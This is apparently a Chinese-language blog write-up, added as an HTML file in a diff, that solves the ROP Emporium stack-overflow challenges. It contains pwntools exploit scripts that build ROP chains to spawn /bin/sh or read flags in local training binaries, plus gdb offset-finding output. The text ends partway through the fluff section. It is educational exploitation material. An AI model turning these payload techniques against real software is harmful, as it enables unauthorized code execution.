@@ -1,0 +1,1357 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8" /><title>PureWeb Blog</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepo/github.css"><link rel="stylesheet" href="/TestRepo/speciou.css"></head>
+<body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo/">Joe1sn&apos;s Blog</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepo/archives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<p><strong>2019-10-28 22:12:46</strong></p>
+<p>ROP-Emporium 系列挑战解题WP</p>
+<!-- more -->
+<h2>ROP-Emporium_ret2win</h2>
+<h3>拿到题肯定是先检查一下：</h3>
+<p><img src="https://img.joe1sn.top/uploads/big/158e3002d52dda776436125773a047fc.png" alt="检查步骤" />
+#2.运行程序，大致了解运行过程：
+<img src="https://img.joe1sn.top/uploads/big/89683bc1e724dcb0be6a0c172340d3da.png" alt="运行程序" />
+#3.由于本人太垃圾了，不会全在gdb里面看，所以只有先在IDA上面看：</p>
+<h3>IDA</h3>
+<h4>shift+f12查看字符串</h4>
+<p><img src="https://img.joe1sn.top/uploads/big/3b992b5c06b20cd0cec9d4a6b6356ffa.png" alt="IDA调试-字符串.png" />
+这里我们可以很清楚的看到可以利用的地方，接下来对函数分析</p>
+<h4>函数分析</h4>
+<h5>查看main()函数</h5>
+<p><img src="https://img.joe1sn.top/uploads/big/d851ebf8636de9fc067f1f55af4f26f5.png" alt="main函数" />
+没有什么问题，倒是有个pwnme看起来很诱人，去康康</p>
+<h5>查看pwnme()</h5>
+<p><img src="https://img.joe1sn.top/uploads/big/5ca7424eca53421bc70dd75accbd24ee.png" alt="pwnme函数" />
+发现了溢出点，memset()申请了0x20的空间，但是fgets()允许输入50字节，所以存在溢出。
+我们得到了偏移值0x20
+获取地址：
+<img src="https://img.joe1sn.top/uploads/big/30649c8f28f59b242ef5bf0db086c909.png" alt="ret2win地址" />
+找到了目标函数地址:0x400811</p>
+<h3>构造EXP：</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+
+p = process(&quot;./ret2win&quot;)
+bin_addr = 0x400811
+payload = 'a'*(0x20+0x8) + p64(bin_addr)
+p.recvuntil(&quot;&gt;&quot;)
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p>运行效果：
+<img src="https://img.joe1sn.top/uploads/big/8aa7a7017745df6e029e5b5a7bd538a7.png" alt="get flag" /></p>
+<p>得到flag:
+ROPE{a_placeholder_32byte_flag!}</p>
+<h3>4.总结</h3>
+<ul>
+<li> 基本的ROP思路：寻找溢出点，通过构造ROP链，通过ROP来改变程序运行的方向</li>
+<li>  64位程序与	32	位不同的是参数传递，64位程序的前六个参数通过	RDI、RSI、RDX、 RCX、R8	和	R9	传递。
+ 所以缓冲区大小参数通过	rdi	传递给fgets()	，大小为 32	字节</li>
+</ul>
+<h2>ROP-Emporium_split</h2>
+<h3>日常操作：</h3>
+<p><img src="https://img.joe1sn.top/uploads/big/927daaa168198ee6eb0755ce765e1019.png" alt="检查与运行" /></p>
+<h3>IDA 启动！</h3>
+<p>查看字符串</p>
+<p><img src="https://img.joe1sn.top/uploads/big/a7aa3de0aea0fdf01ddde43d064a666e.png" alt="查看字符串" />
+发现了有两个和getshell有关的字符串</p>
+<ul>
+<li>
+<p>.rodata段的可以直接利用</p>
+</li>
+<li>
+<p>.data段的需要利用ROP进行引导</p>
+<p><strong>对函数分析，找到存在溢出的函数</strong></p>
+</li>
+<li>
+<p>溢出函数
+<img src="https://upload-images.jianshu.io/upload_images/19933986-94dd4599b5c8eef1.png" alt="pwnme()" />
+此时找到了溢出点，且偏移量为0x20</p>
+</li>
+<li>
+<p>可利用函数
+<img src="https://img.joe1sn.top/uploads/big/fe3bc1072df89c843936fa283a0e1a29.png" alt="usefulFunction()" /></p>
+</li>
+<li>
+<p>2.2.2.1可以简单利用一下：</p>
+</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+p = process('./split')
+context.log_level = 'debug'
+
+excu_addr = 0x400807
+payload = 'a'*(0x20+8) + p64(excu_addr)
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p><img src="https://img.joe1sn.top/uploads/big/5df184b98e383fc75bc2848334f6dc0f.png" alt="利用效果" />
+但是现在我们只能列出该文件夹下面的文件，并不能执行，所以我们要继续努力，这里就可以想起之前.data段的/bin/cat flag.txt
+<strong>查看.data段的/bin/cat flag.txt</strong>
+<img src="https://img.joe1sn.top/uploads/big/0caf5265b43b74824703e85e7a346cbc.png" alt="/bin/cat flag.txt" />
+那我们在利用一下</p>
+<pre><code>from pwn import *
+p = process('./split')
+context.log_level = 'debug'
+
+data_addr = 0x601060
+payload = 'a'*(0x20+8) + p64(data_addr)
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p><img src="https://img.joe1sn.top/uploads/big/7f9651a3272408c4efa39de84a86cadf.png" alt="fun2.py" />
+发现利用并没有成功，查查原因：
+<a href="https://www.cnblogs.com/-gebi-laowang/p/7325412.html"> 数据段（BSS段、DATA段）、代码段（.RODATA）、堆栈段的区别</a>
+(这个也是他人整理过了的)</p>
+<ul>
+<li>.DATA</li>
+</ul>
+<blockquote>
+<p>data(data segment)段      通俗的说，data指那些初始化过（非零）的非const的全局变量。如果数据全是零，为了优化考虑，编译器把它当作bss处理。所以bss属于一个特殊的data。</p>
+</blockquote>
+<ul>
+<li>.RODATA</li>
+</ul>
+<blockquote>
+<p>rodata的意义同样明显，ro代表read only，即只读数据(const)。关于rodata类型的数据，要注意以下几点：
+1.常量不一定就放在rodata里，有的立即数直接编码在指令里，存放在代码段(.text)中。
+2.对于字符串常量，编译器会自动去掉重复的字符串，保证一个字符串在一个可执行文件(EXE/SO)中只存在一份拷贝。
+3.rodata是在多个进程间是共享的，这可以提高空间利用率。
+4.在有的嵌入式系统中，rodata放在ROM(如norflash)里，运行时直接读取ROM内存，无需要加载到RAM内存中。
+5.在嵌入式linux系统中，通过一种叫作XIP（就地执行）的技术，也可以直接读取，而无需要加载到RAM内存中。
+由此可见，把在运行过程中不会改变的数据设为rodata类型的，是有很多好处的：在多个进程间共享，可以大大提高空间利用率，甚至不占用RAM空间。同时由于rodata在只读的内存页面(page)中，是受保护的，任何试图对它的修改都会被及时发现，这可以帮助提高程序的稳定性。</p>
+</blockquote>
+<p>所以程序将/bin/cat flag.txt放在了不同的数据段中，这就需要我们利用ROP去执行</p>
+<h3>构造ROP链</h3>
+<p><img src="https://img.joe1sn.top/uploads/big/5b81bd1d4b69ed9544a4de3407819e9c.png" alt="ROPgadget" />
+这里就需要复习一下 <a href="https://www.jianshu.com/p/11df49e450d8">之前文章</a>提到的64位程序传递参数的方式：</p>
+<blockquote>
+<p>64位程序与 32 位不同的是参数传递，64位程序的前六个参数通过 RDI、RSI、RDX、 RCX、R8 和 R9 传递。</p>
+</blockquote>
+<p>所以我们选择pop rdi的ROP
+得到pop_addr = 0x400883</p>
+<h3>构造EXP</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level='debug'
+p = process(&quot;./split&quot;)
+
+pop_addr = 0x400883
+bin_addr = 0x601060
+system = 0x4005e0
+
+payload = 'a'*(0x20+0x8) + p64(pop_addr) + p64(bin_addr) + p64(system)
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p><img src="https://img.joe1sn.top/uploads/big/4481de143ca15c0b14ce96c07aff070a.png" alt="运行结果" />
+得到flag:
+ROPE{a_placeholder_32byte_flag!}</p>
+<h3>EXP说明：</h3>
+<p>因为只有bin_addr是不够的，bin_addr只是rodata的一个变量，函数的一个参数而已；所以只有利用函数去运行该语句，以这里的payload为例子：</p>
+<blockquote>
+<p>payload = 'a'*(0x20+0x8) + p64(pop_addr) + p64(bin_addr) + p64(system)</p>
+</blockquote>
+<p>首先用0x20个a填充栈上的区域，0x8个a覆盖寄存器的大小（64位寄存器有8字节大小，（64bits=8byte）),溢出后利用ROPgadget跳转至system中rdi的值中，因为rdi储存的是第一个参数，所以函数会执行bin_addr的语句，从而得到flag</p>
+<h3>总结</h3>
+<ul>
+<li>对于不同的数据段，可以利用ROP实现跳转</li>
+<li>64与32的传参方式的不同</li>
+<li>对plt表上函数的利用</li>
+</ul>
+<h2>ROP-Emporium_callme</h2>
+<h3>普通的检查步骤：</h3>
+<p>发现文件有一丝不对</p>
+<p><img src="https://img.joe1sn.top/uploads/big/62ebde412edb93bbd33038a9e3231237.png" alt="callme_64" /></p>
+<p><img src="https://img.joe1sn.top/uploads/big/350fb24eb57c04795eb9de5df04168c8.png" alt="check check" /></p>
+<p>貌似和之前的没什么区别</p>
+<h3>IDA 启动！</h3>
+<p><strong>字符串分析</strong></p>
+<p><img src="https://img.joe1sn.top/uploads/big/4f76f0fcd82d712d6f53b5e85b324170.png" alt="IDA_字符串检查" /></p>
+<ul>
+<li>libcallme.so : 之前文件夹里面的libcallme库</li>
+<li>callme one/two/three : 可能为libcallme中的函数
+<img src="https://img.joe1sn.top/uploads/big/829554f80bd203ecc1cc0d8c89735fba.png" alt="usefulFuction" />
+这个函数使得我们可以调用callme one/two/three,并且得知这三个函数分别需要三个参数</li>
+<li>libcallme.so
+<img src="https://img.joe1sn.top/uploads/big/9de2577e51e30ed93428aa0f513fcfb6.png" alt="libcallme" />
+果然，三个函数在这里</li>
+</ul>
+<p>函数分析</p>
+<ul>
+<li>1.callme_one
+<img src="https://img.joe1sn.top/uploads/big/4796d912064578f2bfbac7e6cf1d1faa.png" alt="callme_one" />
+发现它的作用是读取已经加密了的flag.txt</li>
+<li>2.callme_two
+<img src="https://img.joe1sn.top/uploads/big/db2c1e867a3a296b427ad1c0c6887d91.png" alt="callme_two" />
+发现是利用key1.dat进行一些解密工作</li>
+<li>3.callme_three
+<img src="https://img.joe1sn.top/uploads/big/c0579bae5befbbf30b11e33026247c28.png" alt="callme_three" />
+和callme_two差不多，也是进行解密工作
+分析漏洞点函数
+<img src="https://img.joe1sn.top/uploads/big/9f496a8f546a0b8986710be735942932.png" alt="pwnme" />
+是<code>pwnme</code>函数的一个<code>fgets</code>溢出漏洞
+同样得到偏移值0x20+8
+查看plt表
+<img src="https://img.joe1sn.top/uploads/big/722c39078c723b356ed3663cf04e5dcf.png" alt="plt表" />
+得到地址</li>
+</ul>
+<pre><code>callme_one = 0x401850
+callme_two = 0x401870
+callme_three = 0x401810
+</code></pre>
+<h3>开启了NX保护，而且使用了动态链接库，所以</h3>
+<p>思路</p>
+<ul>
+<li>使用ROP实现跳转</li>
+<li>使用plt表调用函数
+关于plt表：<a href="https://blog.csdn.net/qq_18661257/article/details/54694748">GOT表和PLT表知识详解</a></li>
+</ul>
+<blockquote>
+<p>PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址</p>
+</blockquote>
+<blockquote>
+<p>其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GO表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p>
+</blockquote>
+<p>使用ROPgadget
+<img src="https://upload-images.jianshu.io/upload_images/19933986-fad04533eaffd560.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ROPgadget" />
+回忆之前的知识：</p>
+<blockquote>
+<p>64位程序与 32 位不同的是参数传递，64位程序的前六个参数通过 RDI、RSI、RDX、 RCX、R8 和 R9 传递</p>
+</blockquote>
+<p>为了程序的简便性，我们选择<code>pop rdi_rsi_rdx</code>的gadget，应为这样只需要一个gadget就可以实现对函数参数(有三个参数)的填入
+那么ROP为：0x401ab0</p>
+<h3>构造EXP</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+p = process('./callme')
+
+pop_rdi_rsi_rdx = 0x401ab0
+
+callme_one = 0x401850
+callme_two = 0x401870
+callme_three = 0x401810
+
+payload = 'a'*(0x20+8)
+payload += p64(pop_rdi_rsi_rdx) + p64(1) + p64(2) + p64(3)
+payload += p64(callme_one)
+
+payload += p64(pop_rdi_rsi_rdx) + p64(1) + p64(2) + p64(3)
+payload += p64(callme_two)
+
+payload += p64(pop_rdi_rsi_rdx) + p64(1) + p64(2) + p64(3)
+payload += p64(callme_three)
+
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p>运行结果：
+<img src="https://upload-images.jianshu.io/upload_images/19933986-21831125a9394a68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="运行结果" />
+得到flag:
+ROPE{a_placeholder_32byte_flag!}</p>
+<h3>EXP说明</h3>
+<p>1.offset</p>
+<pre><code>payload = 'a'*(0x20+8)
+</code></pre>
+<p>填充栈上的空间，并使之覆盖寄存器
+2.</p>
+<pre><code>payload += p64(pop_rdi_rsi_rdx) + p64(1) + p64(2) + p64(3)
+payload += p64(callme_one)
+</code></pre>
+<p>利用ROPgadget向callme_one填入三个参数,之后的也是</p>
+<h3>总结</h3>
+<ul>
+<li>如果plt表存在，则可以利用上面的函数，以ROPgadget的形式进行利用</li>
+<li>切记，ROP只是填入参数，还是要调用函数才能成功运行的</li>
+</ul>
+<h2>ROP-Emporium_write4</h2>
+<h3>日常操作：</h3>
+<p><img src="https://img.joe1sn.top/uploads/big/2727c8fe68a88b8eb822ddae0072cc62.png" alt="检查与运行" /></p>
+<h3>IDA 启动！</h3>
+<p>查看字符串
+<img src="https://img.joe1sn.top/uploads/big/b6203726b68595c33797caab2a0202f1.png" alt="字符串查看" />
+并没有发现什么有用的信息，所以这里就引申出一个重要方法: 向程序写入可执行字符串</p>
+<p><strong>函数分析</strong></p>
+<p><code>pwnme</code>
+<img src="https://img.joe1sn.top/uploads/big/4c5ca72d9f9eb98e5695f1e45305b181.png" alt="pwnme函数" />
+又是简单的fgets溢出漏洞嘛，
+<strong>漏洞点分析</strong>
+但是，不要忘了fgets的声明：</p>
+<pre><code class="language-c">char *fgets(char *str, int n, FILE *stream)
+</code></pre>
+<p>再看看说明：</p>
+<blockquote>
+<p>从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</p>
+</blockquote>
+<p>也就是说我们可以把/bin/sh这样的语段写入其他段中（我这里选的是bss段），然后再用system的plt表地址利用ROP跨段去执行这样一个语句</p>
+<h3>挑选ROP链</h3>
+<p>这里也是首选ROPgadget(实际上只会这一个)
+<img src="https://img.joe1sn.top/uploads/big/120b891152ac75083bf3211fd3511eea.png" alt="pop|ret" />
+虽然找到了pop rdi: 0x0400893
+但是我们发现，fgets要三个参数，而这里缺少pop rdx的gadget.
+缺少可利用gadget方法：
+<a href="https://blog.csdn.net/u014379540/article/details/51996209">r0-r15寄存器的作用</a></p>
+<blockquote>
+<p>R14是链接寄存器 lr。如果您保存了返回地址，则可以在调用之间将 r14 用于其它用途，程序返回时要恢复</p>
+</blockquote>
+<p>也就是说我们可以先把bin/sh传给r14，在保存返回地址，那么r14就可以被任意调用了</p>
+<p>3.3寻找新的gadget
+<img src="https://img.joe1sn.top/uploads/big/0b59660c68de9f3eb915872d81891859.png" alt="mov|pop|ret" />
+这里找到了我们想要的gadget：</p>
+<pre><code class="language-assembly">0x0000000000400820 : mov qword ptr [r14], r15 ; ret
+0x0000000000400890 : pop r14 ; pop r15 ; ret
+</code></pre>
+<p><strong>寻找合适的段</strong>
+<img src="https://img.joe1sn.top/uploads/big/468455412e04e5efd8bb818cd42c3c02.png" alt="段" />
+我们是希望能够将控制命令写入到另一个段中，再利用ROP去调用并执行它，所以这个段必须有写入(W)和阅读(R)的权限，比如<code>.bss .data. LOAD</code>
+这路我选择bss段：<code>0x601060</code></p>
+<p><strong>选择合适的函数</strong>
+肯定希望以system运行了
+<img src="https://img.joe1sn.top/uploads/big/a7fc18ac8f4874d6ae9031a246a1730d.png" alt="system地址" /></p>
+<blockquote>
+<p>system:0x4005E0</p>
+</blockquote>
+<h3>构造EXP</h3>
+<p>由于开启了NX保护，我们就先通过溢出
+把r14弹出来(pop r14 ; pop r15 ; ret)，
+再迁到bss段(0x601060)，马上写入/bin/sh，然后进行赋值操作(mov qword ptr [r14], r15 ; ret),
+在弹出rdi(pop rdi)并在bss段(0x601060)调用system函数(0x4005E0)</p>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+p = process('./write4')
+
+
+sys_addr = 0x4005E0
+bss_addr = 0x601060
+mov_r14_r15 = 0x400820
+pop_r14_r15 = 0x400890
+pop_rdi = 0x400893
+
+payload = 'a'*(0x20+8)
+payload += p64(pop_r14_r15) 
+payload += p64(bss_addr)
+payload += &quot;/bin/sh&quot;.ljust(8,&quot;\x00&quot;)
+payload += p64(mov_r14_r15)
+payload += p64(pop_rdi)
+payload += p64(bss_addr)
+payload += p64(sys_addr)
+
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.recv()
+p.interactive()
+</code></pre>
+<p>运行效果：
+<img src="https://img.joe1sn.top/uploads/big/692a5982fc25f7d44a18a4470cb6dc66.png" alt="运行结果" />
+得到flag:
+ROPE{a_placeholder_32byte_flag!}</p>
+<h3>程序说明</h3>
+<ul>
+<li>关于ljust()</li>
+</ul>
+<blockquote>
+<p>Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。</p>
+</blockquote>
+<p>就是填充最高位字节，如果填不满，就不会运行到这里，同样也起到了数据对齐的作用</p>
+<h3>总结</h3>
+<ul>
+<li>关于不同种类寄存器的利用</li>
+<li>没有/bin/sh这种的利用</li>
+<li>关于段的跳跃+利用</li>
+</ul>
+<h2>ROP-Emporium_checkBadchar</h2>
+<p>检查并运行
+<img src="https://img.joe1sn.top/uploads/big/a403019569a21b2a6e5f4df90118eb95.png" alt="checkcheck" />
+<strong>还有就是这里给了提示，就是不能输入 b i c / <space> f n s这些字符串</strong></p>
+<h3>IDA，启动！</h3>
+<p>字符串并没有什么值得用的地方,所以又是要写入的</p>
+<p>函数分析
+<code>pwnme</code>
+<img src="https://img.joe1sn.top/uploads/big/b9e0c0abab6b697f07477fad8875d135.png" alt="pwnme" />
+找到溢出点函数，但是又调用了checkBadchar函数
+<code>checkBadchar</code>
+<img src="https://img.joe1sn.top/uploads/big/ba2e35e269b6ee7c3e7da54e2c0b0e36.png" alt="checkBadchar" />
+很明显就看到了对以上字符串的检验，而且检验范围是0x400A40--0x400A7C</p>
+<p><strong>相关函数的地址</strong></p>
+<blockquote>
+<p>system:0x4006F0
+bss:0x601080
+#3.想办法构造payload
+##3.1思路
+原来题目的地址暗示了一种方法：异或
+现在理一下思路
+栈溢出 -&gt; 在bss段写入异或后的'/bin/sh\x00' -&gt; 利用系统自带的xorgadget还原 -&gt; 调用system函数执行</p>
+</blockquote>
+<h3>合适的gadget</h3>
+<p>和还是那个一道题的思路差不多，很容易就找到合适的gadget</p>
+<blockquote>
+<p>0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
+0x0000000000400b3b : pop r12 ; pop r13 ; ret
+0x0000000000400b40 : pop r14 ; pop r15 ; ret
+0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
+0x0000000000400b39 : pop rdi ; ret</p>
+</blockquote>
+<p>计算合适异或的值</p>
+<pre><code>badchars = [98,105,99,47,32,102,110,115]
+binsh = &quot;/bin/sh\x00&quot;
+xor = 1
+while 1:
+	for i in binsh:
+		tmp = ord(i)^xor
+		if tmp in badchars:
+			xor += 1
+			break
+		if i == '\x00':
+			print(xor)
+			xor += 1
+			break
+	if xor == 10:
+		break
+</code></pre>
+<pre><code>root@MSI:/mnt/rop_emporium_all_challenges/05_badchars# python2 pass.py
+2
+3
+5
+9
+</code></pre>
+<p>可以随机选择一些数，这里选2</p>
+<ul>
+<li>但是有些时候加密后对应ascii码是结束字符，所以还要小心</li>
+</ul>
+<h3>构造EXP</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+p = process('./badchars')
+
+pop_r12_r13 = 0x400b3b
+mov_r13_r12 = 0x400b34
+pop_r14_r15 = 0x400b40
+xor_r15_r14 = 0x400b30
+pop_rdi = 0x400b39
+
+sys_addr = 0x4006F0
+bss_addr = 0x601080
+
+bin_sh = '/bin/sh\x00'
+xor_bin_sh = ''
+
+for i in bin_sh:
+	xor_bin_sh += chr(ord(i)^2)
+
+payload = 'a'*(0x20+8)
+payload += p64(pop_r12_r13)
+payload += xor_bin_sh
+payload += p64(bss_addr)
+payload += p64(mov_r13_r12)
+
+for i in range(0,len(xor_bin_sh)):
+	payload += p64(pop_r14_r15)
+	payload += p64(2)
+	payload += p64(bss_addr + i)
+	payload += p64(xor_r15_r14)
+
+payload += p64(pop_rdi)
+payload += p64(bss_addr)
+payload += p64(sys_addr)
+
+p.recvuntil('&gt;')
+p.sendline(payload)
+p.interactive() 
+</code></pre>
+<p>运行结果：
+<img src="https://img.joe1sn.top/uploads/big/60da69f12b7000e44492359fb6a4cb70.png" alt="exp.py" />
+得到flag:
+ROPE{a_placeholder_32byte_flag!}</p>
+<h3>EXP说明</h3>
+<p>溢出后，从栈上弹出寄存器r12和r13，将加密后的binsh传给bss段，再逐步异或还原/bin/sh，最后把结果输进rdi，在bss段调用system函数执行/bin/sh</p>
+<h3>总结</h3>
+<ul>
+<li>遇见有删选字符串的题，可以加密payload的方式进行（有点像shellcode）</li>
+<li>异或的汇编语言要循环后才能还原</li>
+</ul>
+<h2>ROP-Emporium_fluff</h2>
+<p>+=====================================================
+| 由此见识和了解radare2(真·linux中的IDA)，所以尽量在linux环境下做题
++=====================================================</p>
+<h3>检查并运行</h3>
+<p><img src="https://img.joe1sn.top/uploads/big/0a526631e18848911d64d35cfa51c720.png" alt="rabin2检测" /></p>
+<ul>
+<li>一样的也是64位，NX保护开启</li>
+<li>但是用radare2的rabin2可以看见编译器、大小端排序……这便是radare2的强大之处的其一</li>
+</ul>
+<h3>分析函数</h3>
+<p>这里就暂时不用IDA了，用新的工具：<strong>r2</strong>
+用r2简单分析</p>
+<pre><code> r2 -AAA ./fluff
+</code></pre>
+<p>接下来使用</p>
+<pre><code>afl
+</code></pre>
+<p>来查看有哪些函数在plt上
+<img src="https://img.joe1sn.top/uploads/big/bb3ce746d2fb3f90b24efdbda1c93c1c.png" alt="r2分析" />
+发现了pwnme、usefulFuncution之类的函数，并且有system这些函数
+而且r2会简单的进行fuzz测试
+<code>pwnme</code>
+使用命令</p>
+<pre><code>pdf @sym.pwnme
+</code></pre>
+<p><img src="https://img.joe1sn.top/uploads/big/bb3ce746d2fb3f90b24efdbda1c93c1c.png" alt="pwnme" />
+会发现r2不仅显示了汇编代码，而且写出了伪代码</p>
+<ul>
+<li>如果只看伪代码的话，可以用以下命令：</li>
+</ul>
+<pre><code>pdc @sym.pwnme
+</code></pre>
+<p><img src="https://img.joe1sn.top/uploads/big/3d043c7e2cf3a0d006c83e9feaac78ac.png" alt="pwnme在r2中的伪代码" /></p>
+<p>+=====================================================
+|  会发现逻辑性比IDA差一些，但是更加细致，接近汇编，有些IDA无法显示
+| 的伪代码，使用r2也可以显示
++=====================================================</p>
+<p><code>0x4007f7</code>可以看出给size的空间大小是<strong>512</strong>字节
+<code>0x4007b9</code>结合后面的逻辑可以看出s的大小是0x20字节
+所以存在一个fgets()的溢出漏洞,偏移量：40字节</p>
+<p><code>usefulFunction</code>
+唯一的作用是告诉我们要将/bin/sh写入段中
+过程和上面的差不多
+<strong>利用gdb查找偏移：</strong>**</p>
+<pre><code>gdb-peda$ file fluff
+Reading symbols from fluff...(no debugging symbols found)...done.
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ run
+Starting program: /mnt/c/Disk E/CTF/Question/rop_emporium_all_challenges/06_fluff/fluff
+fluff by ROP Emporium
+64bits
+
+You know changing these strings means I have to rewrite my solutions...
+&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffffffee4d0 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+RBX: 0x0
+RCX: 0x41414b4141354141 ('AA5AAKAA')
+RDX: 0x7fffff3f6790 --&gt; 0x0
+RSI: 0x602075 --&gt; 0x0
+RDI: 0x7ffffffee535 --&gt; 0xdaeeab72b0000000
+RBP: 0x6141414541412941 ('A)AAEAAa')
+RSP: 0x7ffffffee4f8 (&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+RIP: 0x400806 --&gt; 0x95bbfe5894855c3
+R8 : 0x602075 --&gt; 0x0
+R9 : 0x4841413241416341 ('AcAA2AAH')
+R10: 0x4141334141644141 ('AAdAA3AA')
+R11: 0x7fffff3f4b78 --&gt; 0x603010 --&gt; 0x0
+R12: 0x400650 --&gt; 0x89485ed18949ed31
+R13: 0x7ffffffee5e0 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4007ff &lt;pwnme+74&gt;: call   0x400620 &lt;fgets@plt&gt;
+   0x400804 &lt;pwnme+79&gt;: nop
+   0x400805 &lt;pwnme+80&gt;: leave
+=&gt; 0x400806 &lt;pwnme+81&gt;: ret
+   0x400807 &lt;usefulFunction&gt;:   push   rbp
+   0x400808 &lt;usefulFunction+1&gt;: mov    rbp,rsp
+   0x40080b &lt;usefulFunction+4&gt;: mov    edi,0x40095b
+   0x400810 &lt;usefulFunction+9&gt;: call   0x4005e0 &lt;system@plt&gt;
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffffffee4f8 (&quot;AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+0008| 0x7ffffffee500 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+0016| 0x7ffffffee508 (&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+0024| 0x7ffffffee510 (&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+0032| 0x7ffffffee518 (&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL\n&quot;)
+0040| 0x7ffffffee520 (&quot;AJAAfAA5AAKAAgAA6AAL\n&quot;)
+0048| 0x7ffffffee528 (&quot;AAKAAgAA6AAL\n&quot;)
+0056| 0x7ffffffee530 --&gt; 0xa4c414136 ('6AAL\n')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400806 in pwnme ()
+gdb-peda$ pattern_search
+Registers contain pattern buffer:
+R9+0 found at offset: 56
+RBP+0 found at offset: 32
+R10+0 found at offset: 64
+RCX+0 found at offset: 85
+Registers point to pattern buffer:
+[RAX] --&gt; offset 0 - size ~102
+[RSP] --&gt; offset 40 - size ~62
+Pattern buffer found at:
+0x00602010 : offset    0 - size  100 ([heap])
+0x00007ffffffee4d0 : offset    0 - size  100 ($sp + -0x28 [-10 dwords])
+References to pattern buffer found at:
+0x00007fffff3f48f8 : 0x00602010 (/lib/x86_64-linux-gnu/libc-2.23.so)
+0x00007fffff3f4900 : 0x00602010 (/lib/x86_64-linux-gnu/libc-2.23.so)
+0x00007fffff3f4908 : 0x00602010 (/lib/x86_64-linux-gnu/libc-2.23.so)
+0x00007fffff3f4910 : 0x00602010 (/lib/x86_64-linux-gnu/libc-2.23.so)
+0x00007fffff3f4918 : 0x00602010 (/lib/x86_64-linux-gnu/libc-2.23.so)
+0x00007ffffffeb8c0 : 0x00007ffffffee4d0 ($sp + -0x2c38 [-2830 dwords])
+0x00007ffffffee3e8 : 0x00007ffffffee4d0 ($sp + -0x110 [-68 dwords])
+0x00007ffffffee408 : 0x00007ffffffee4d0 ($sp + -0xf0 [-60 dwords])
+0x00007ffffffee430 : 0x00007ffffffee4d0 ($sp + -0xc8 [-50 dwords])
+0x00007ffffffee480 : 0x00007ffffffee4d0 ($sp + -0x78 [-30 dwords])
+</code></pre>
+<p>也可以直接找到距离RSP的偏移位<strong>40（0x20+8）</strong></p>
+<h3>构造payload</h3>
+<p><strong>ROPgadget分析</strong>
